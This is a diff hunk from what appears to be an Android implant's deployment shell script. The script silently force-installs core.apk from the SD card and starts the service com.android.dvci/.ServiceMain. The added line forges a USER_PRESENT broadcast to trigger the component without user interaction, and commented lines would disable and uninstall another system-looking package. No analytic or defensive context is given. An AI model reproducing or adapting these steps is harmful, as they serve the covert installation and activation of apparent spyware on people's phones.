@@ -12,7 +12,7 @@ pm install -f /sdcard/core.apk
 sleep 2
 
 am startservice com.android.dvci/.ServiceMain
-
+am broadcast -a android.intent.action.USER_PRESENT
 #pm disable com.android.deviceinfo
 #pm uninstall com.android.deviceinfo
 
